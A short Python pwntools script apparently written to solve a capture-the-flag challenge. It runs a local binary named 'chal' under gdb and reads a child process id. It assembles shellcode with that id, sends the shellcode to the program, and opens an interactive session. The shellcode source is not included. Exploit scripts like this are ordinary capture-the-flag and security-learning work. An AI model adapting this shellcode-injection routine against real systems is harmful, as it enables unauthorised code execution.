#!/bin/python

from pwn import *
import os

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

'''
'''

io = gdb.debug('./chal', gdbscript='''
    set follow-fork-mode child

    b main
    c
        ''')

io.recvuntil(b'[DEBUG] child pid: ')
pid = int(io.recvline().decode('ASCII'))

os.system('nasm shellcode.asm -D pid=' + str(pid))
shellcode = open('shellcode', 'rb').read()

io.recvuntil(b'shellcode length? ')
io.sendline(str(len(shellcode)))

io.recvuntil(b'of shellcode. ')
io.sendline(shellcode)

io.interactive()
